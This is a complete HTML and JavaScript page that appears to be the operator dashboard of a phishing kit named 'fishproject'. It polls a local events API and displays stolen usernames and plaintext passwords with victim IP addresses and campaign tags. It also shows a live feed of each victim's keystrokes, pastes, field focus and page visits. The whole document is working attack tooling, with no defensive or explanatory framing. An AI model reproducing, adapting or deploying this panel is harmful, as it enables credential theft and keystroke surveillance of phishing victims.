<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="robots" content="noindex, nofollow" />
<title>fishproject :: dashboard</title>
<style>
  :root {
    --bg:#0d1117; --panel:#161b22; --line:#30363d; --text:#e6edf3;
    --dim:#8b949e; --green:#3fb950; --red:#f85149; --blue:#58a6ff;
    --yellow:#e3b341; --mag:#bc8cff;
  }
  *{box-sizing:border-box}
  html,body{margin:0;background:var(--bg);color:var(--text);
    font:14px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  header{position:sticky;top:0;z-index:5;background:var(--panel);
    border-bottom:1px solid var(--line);padding:12px 16px;
    display:flex;align-items:center;gap:14px;flex-wrap:wrap}
  h1{margin:0;font-size:15px;font-weight:600;letter-spacing:.3px}
  h1 span{color:var(--mag)}
  .stat{font-size:12px;color:var(--dim)}
  .stat b{color:var(--text);font-size:15px;font-weight:600}
  .dot{width:8px;height:8px;border-radius:50%;background:var(--dim);display:inline-block}
  .dot.on{background:var(--green);box-shadow:0 0 8px var(--green)}
  .dot.off{background:var(--red)}
  main{padding:16px;display:grid;gap:16px;max-width:1100px;margin:0 auto}
  section{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}
  section > h2{margin:0;padding:10px 14px;font-size:12px;letter-spacing:.8px;
    text-transform:uppercase;color:var(--dim);border-bottom:1px solid var(--line);
    display:flex;justify-content:space-between;align-items:center}
  .cred{border-bottom:1px solid var(--line);padding:12px 14px}
  .cred:last-child{border-bottom:0}
  .cred .row{display:flex;gap:10px;align-items:baseline;flex-wrap:wrap}
  .cred .u{font-family:ui-monospace,Consolas,monospace;font-size:15px;color:var(--yellow);font-weight:600;word-break:break-all}
  .cred .p{font-family:ui-monospace,Consolas,monospace;font-size:15px;color:var(--text);word-break:break-all}
  .cred .meta{color:var(--dim);font-size:11px;margin-top:5px;display:flex;gap:12px;flex-wrap:wrap}
  .cred .tag{color:var(--mag)}
  .feed{max-height:46vh;overflow:auto}
  .ev{display:flex;gap:10px;padding:5px 14px;border-bottom:1px solid #21262d;font-size:12.5px}
  .ev:last-child{border-bottom:0}
  .ev .t{color:var(--dim);font-family:ui-monospace,Consolas,monospace;white-space:nowrap}
  .ev .k{color:var(--blue);min-width:88px;font-family:ui-monospace,Consolas,monospace}
  .ev .v{color:var(--green);font-family:ui-monospace,Consolas,monospace;word-break:break-all}
  .ev .k.big{color:var(--red);font-weight:600}
  .empty{color:var(--dim);padding:16px 14px;font-style:italic}
  .e2{color:var(--dim);font-size:11px;font-family:ui-monospace,Consolas,monospace}
</style>
</head>
<body>
<header>
  <span class="dot off" id="dot"></span>
  <h1>fish<span>project</span></h1>
  <span class="stat">creds <b id="n-cred">0</b></span>
  <span class="stat">visits <b id="n-visit">0</b></span>
  <span class="stat">keys <b id="n-key">0</b></span>
  <span class="stat" id="upd" style="margin-left:auto">connecting...</span>
</header>
<main>
  <section>
    <h2>Credentials <span class="e2" id="c-cred"></span></h2>
    <div id="creds"><div class="empty">nothing yet</div></div>
  </section>
  <section>
    <h2>Live feed <span class="e2">every keystroke</span></h2>
    <div class="feed" id="feed"><div class="empty">nothing yet</div></div>
  </section>
</main>
<script>
(function(){
  var K = new URLSearchParams(location.search).get("k") || "";
  var API = "/api/events?k=" + encodeURIComponent(K);
  var last = 0;

  function esc(s){ return String(s == null ? "" : s).replace(/[&<>"]/g, function(c){
    return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]; }); }

  function hhmmss(iso){
    try { return new Date(iso).toLocaleTimeString(); } catch(e){ return iso; }
  }

  function render(events){
    var creds = [], keys = 0, visits = 0, feed = [];
    // newest first
    for (var i = events.length - 1; i >= 0; i--){
      var e = events[i];
      var t = hhmmss(e.ts);
      if (e.event === "credentials"){
        var d = e.data || {};
        creds.push(
          '<div class="cred"><div class="row">' +
          '<span class="u">'+esc(d.username||"")+'</span>' +
          '<span class="p">'+esc(d.password||"")+'</span></div>' +
          '<div class="meta"><span>'+esc(t)+'</span>' +
          '<span>'+esc(e.ip||"")+'</span>' +
          (e.campaign ? '<span class="tag">#'+esc(e.campaign)+'</span>' : '') +
          '</div></div>');
      } else if (e.event === "visit"){
        visits++;
      } else if (e.event === "keystroke" || e.event === "keystrokes"){
        if (e.event === "keystroke") keys++;
        else keys += (e.data && e.data.count) || 0;
      }
      if (e.event !== "bye" && e.event !== "hidden"){
        var label, val;
        if (e.event === "credentials"){ label = "SUBMIT"; val = (e.data.username||"")+" / "+(e.data.password||""); }
        else if (e.event === "visit"){ label = "VISIT"; val = e.ua || ""; }
        else if (e.event === "keystroke"){ label = e.data.field || "?"; val = e.data.value || ""; }
        else if (e.event === "input"){ label = (e.data.field||"?")+" (paste)"; val = e.data.value || ""; }
        else if (e.event === "focus"){ label = "focus"; val = e.data.field || ""; }
        else { label = e.event; val = JSON.stringify(e.data || {}); }
        feed.push('<div class="ev"><span class="t">'+esc(t)+'</span>' +
          '<span class="k'+(e.event==="credentials"?" big":"")+'">'+esc(label)+'</span>' +
          '<span class="v">'+esc(val)+'</span></div>');
      }
    }
    document.getElementById("n-cred").textContent = creds.length;
    document.getElementById("n-visit").textContent = visits;
    document.getElementById("n-key").textContent = keys;
    document.getElementById("c-cred").textContent = creds.length ? "" : "";
    document.getElementById("creds").innerHTML = creds.length ? creds.join("") : '<div class="empty">nothing yet</div>';
    var f = document.getElementById("feed");
    var atBottom = (f.scrollTop + f.clientHeight) >= (f.scrollHeight - 30);
    f.innerHTML = feed.length ? feed.slice(0, 300).join("") : '<div class="empty">nothing yet</div>';
    if (atBottom) f.scrollTop = 0;
  }

  function tick(){
    fetch(API, { cache: "no-store" })
      .then(function(r){ if(!r.ok) throw new Error(r.status); return r.json(); })
      .then(function(events){
        document.getElementById("dot").className = "dot on";
        document.getElementById("upd").textContent = "live - " + new Date().toLocaleTimeString();
        render(events || []);
        last = 0;
      })
      .catch(function(err){
        document.getElementById("dot").className = "dot off";
        document.getElementById("upd").textContent = "no connection (" + err.message + ")";
      });
  }
  tick();
  setInterval(tick, 2000);
})();
</script>
</body>
</html>
